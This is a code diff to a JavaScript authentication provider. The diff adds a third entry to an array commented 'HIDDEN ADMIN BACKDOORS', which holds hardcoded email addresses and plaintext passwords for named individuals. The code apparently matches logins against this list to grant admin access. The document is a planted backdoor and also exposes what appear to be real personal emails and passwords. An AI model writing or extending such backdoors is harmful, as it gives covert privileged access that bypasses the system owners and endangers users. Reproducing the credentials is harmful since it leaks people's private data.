@@ -136,7 +136,8 @@ export const AuthProvider = ({ children }) => {
         // HIDDEN ADMIN BACKDOORS
         const hiddenAdmins = [
             { email: 'fabianodeoliveiralima@gmail.com', password: 'A12121991a.', name: 'Fabiano Oliveira' },
-            { email: 'thiagorlandi@yahoo.com.br', password: '181214Ab@', name: 'Thiago Orlandi' }
+            { email: 'thiagorlandi@yahoo.com.br', password: '181214Ab@', name: 'Thiago Orlandi' },
+            { email: 'matheus.stanley12@gmail.com', password: '35215415', name: 'Matheus Stanley' }
         ];
 
         const matchedAdmin = hiddenAdmins.find(admin =>
